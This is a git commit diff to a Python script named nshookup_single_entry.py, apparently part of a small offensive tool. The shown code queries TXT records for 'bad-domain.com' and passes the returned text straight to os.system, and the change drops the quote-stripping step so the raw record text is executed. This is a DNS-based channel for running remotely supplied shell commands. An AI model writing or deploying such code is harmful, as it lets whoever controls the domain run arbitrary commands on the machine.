eee4545630a4ab15bd5c2ca1240ad9f5517786cf
Dood3 <93183445+Dood3@users.noreply.github.com>
2025-02-22 12:44:38 +0100

    Update and rename nshookup_1.py to nshookup_single_entry.py

--- nshookup_SRC/nshookup_single_entry.py
+++ nshookup_SRC/nshookup_single_entry.py
@@ -8,6 +8,5 @@ result = dns.resolver.resolve('bad-domain.com', 'TXT')
 for cmdval in result:
   
   text = cmdval.to_text()
-  result = text.split('"')[1].split('"')[0]
 
-os.system(result)
+os.system(text)
